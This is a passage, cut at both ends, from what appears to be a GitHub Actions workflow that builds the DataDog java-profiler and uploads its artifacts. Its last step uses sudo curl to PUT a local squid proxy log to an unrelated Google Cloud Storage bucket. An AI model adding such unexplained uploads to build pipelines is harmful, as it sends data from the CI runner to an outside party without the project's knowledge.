          ddprof-lib/build/tmp/compileReleaseLinuxCpp/output.txt

          '
    - continue-on-error: true
      if: success()
      uses: actions/upload-artifact@v3
      with:
        name: x64-glibc-${{ matrix.java_version }}-${{ matrix.config }}
        path: build/
    - continue-on-error: true
      if: failure()
      uses: actions/upload-artifact@v3
      with:
        name: failures
        path: failures_glibc-${{ matrix.java_version }}-${{ matrix.config }}.txt
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/DataDog/java-profiler.$(date
